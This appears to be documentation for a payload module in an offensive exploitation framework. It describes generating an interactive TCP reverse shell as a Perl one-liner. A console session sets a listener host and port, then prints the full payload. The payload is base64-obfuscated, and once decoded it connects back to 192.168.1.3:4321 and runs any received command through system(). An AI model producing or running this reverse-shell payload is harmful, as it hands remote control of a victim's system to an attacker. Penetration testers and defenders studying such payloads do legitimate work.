## Description

Module generates payload that creates interactive tcp reverse shell by using perl one-liner. 

## Verification Steps

  1. Start `./exf.py`
  2. Do: `use payloads/cmd/perl_reverse_tcp`
  3. Do: `set lhost 192.168.1.3`
  4. Do: `set lport 4321`
  5. Do: `run`
  6. Module generates perl tcp reverse shell payload

## Scenarios

```
exf > use payloads/cmd/perl_reverse_tcp
exf (Perl Reverse TCP One-Liner) > set lhost 192.168.1.3
[+] lhost => 192.168.1.3
exf (Perl Reverse TCP One-Liner) > set lport 4321
[+] lport => 4321
exf (Perl Reverse TCP One-Liner) > run
[*] Running module...
[*] Generating payload
perl -MIO -e "use MIME::Base64;eval(decode_base64('dXNlIElPO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxOTIuMTY4LjEuMzo0MzIxIik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3doaWxlKDw+KXtpZigkXz1+IC8oLiopLyl7c3lzdGVtICQxO319Ow=='));"
```
